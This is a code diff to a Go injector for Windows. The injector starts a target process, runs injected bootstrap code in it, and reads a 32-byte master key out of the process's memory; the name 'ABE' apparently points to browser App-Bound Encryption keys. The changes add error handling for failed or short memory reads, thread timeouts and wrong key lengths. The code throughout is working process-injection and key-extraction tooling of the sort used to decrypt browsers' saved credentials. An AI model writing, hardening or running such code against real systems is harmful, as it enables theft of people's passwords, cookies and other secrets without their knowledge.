@@ -77,14 +77,21 @@ func (r *Reflective) Inject(exePath string, payload []byte, env map[string]strin
 	}
 
 	// Read output before TerminateProcess — after kill the memory is gone.
-	result := readScratch(pi.Process, remoteBase)
+	result, readErr := readScratch(pi.Process, remoteBase)
 
 	_ = windows.TerminateProcess(pi.Process, 0)
 	_, _ = windows.WaitForSingleObject(pi.Process, uint32(terminateWait/time.Millisecond))
 	terminated = true
 
+	if readErr != nil {
+		return nil, fmt.Errorf("injector: %w", readErr)
+	}
 	if result.Status != bootstrap.KeyStatusReady {
 		return nil, fmt.Errorf("injector: payload did not publish key (%s)", formatABEError(result))
+	}
+	if len(result.Key) != bootstrap.KeyLen {
+		return nil, fmt.Errorf("injector: payload signaled ready but key length is %d (want %d)",
+			len(result.Key), bootstrap.KeyLen)
 	}
 	return result.Key, nil
 }
@@ -172,23 +179,36 @@ func runAndWait(proc windows.Handle, remoteBase uintptr, loaderRVA uint32, wait 
 	}
 	defer windows.CloseHandle(windows.Handle(hThread))
 
-	_, _ = windows.WaitForSingleObject(windows.Handle(hThread), uint32(wait/time.Millisecond))
-	return nil
+	state, err := windows.WaitForSingleObject(windows.Handle(hThread), uint32(wait/time.Millisecond))
+	if err != nil {
+		return fmt.Errorf("injector: WaitForSingleObject: %w", err)
+	}
+	switch state {
+	case windows.WAIT_OBJECT_0:
+		return nil
+	case uint32(windows.WAIT_TIMEOUT):
+		return fmt.Errorf("injector: remote Bootstrap thread timed out after %s", wait)
+	default:
+		return fmt.Errorf("injector: remote Bootstrap thread wait returned 0x%x", state)
+	}
 }
 
 // readScratch pulls the payload's diagnostic header and (on success) the
-// master key out of the target process's scratch region via a single
-// 12-byte ReadProcessMemory covering marker..com_err, plus an optional
-// second read for the 32-byte key when Status == ready.
-func readScratch(proc windows.Handle, remoteBase uintptr) scratchResult {
+// master key out of the target process's scratch region. A non-nil error
+// means our own ReadProcessMemory call failed (distinct from the payload
+// reporting a structured failure via result.Status/ErrCode/HResult).
+func readScratch(proc windows.Handle, remoteBase uintptr) (scratchResult, error) {
 	// hdr covers offsets 0x28..0x33: marker, status, extract_err_code,
 	// _reserved, hresult (LE u32), com_err (LE u32).
 	var hdr [12]byte
 	var n uintptr
 	if err := windows.ReadProcessMemory(proc,
 		remoteBase+uintptr(bootstrap.MarkerOffset),
-		&hdr[0], uintptr(len(hdr)), &n); err != nil || int(n) != len(hdr) {
-		return scratchResult{}
+		&hdr[0], uintptr(len(hdr)), &n); err != nil {
+		return scratchResult{}, fmt.Errorf("read scratch header: %w", err)
+	}
+	if int(n) != len(hdr) {
+		return scratchResult{}, fmt.Errorf("read scratch header: short read %d/%d", n, len(hdr))
 	}
 	result := scratchResult{
 		Marker:  hdr[0],
@@ -198,17 +218,20 @@ func readScratch(proc windows.Handle, remoteBase uintptr) scratchResult {
 		ComErr:  binary.LittleEndian.Uint32(hdr[8:12]),
 	}
 	if result.Status != bootstrap.KeyStatusReady {
-		return result
+		return result, nil
 	}
 
 	buf := make([]byte, bootstrap.KeyLen)
 	if err := windows.ReadProcessMemory(proc,
 		remoteBase+uintptr(bootstrap.KeyOffset),
-		&buf[0], uintptr(bootstrap.KeyLen), &n); err != nil || int(n) != bootstrap.KeyLen {
-		return result
+		&buf[0], uintptr(bootstrap.KeyLen), &n); err != nil {
+		return result, fmt.Errorf("read master key from scratch: %w", err)
+	}
+	if int(n) != bootstrap.KeyLen {
+		return result, fmt.Errorf("read master key from scratch: short read %d/%d", n, bootstrap.KeyLen)
 	}
 	result.Key = buf
-	return result
+	return result, nil
 }
 
 // patchPreresolvedImports writes five pre-resolved Win32 function pointers
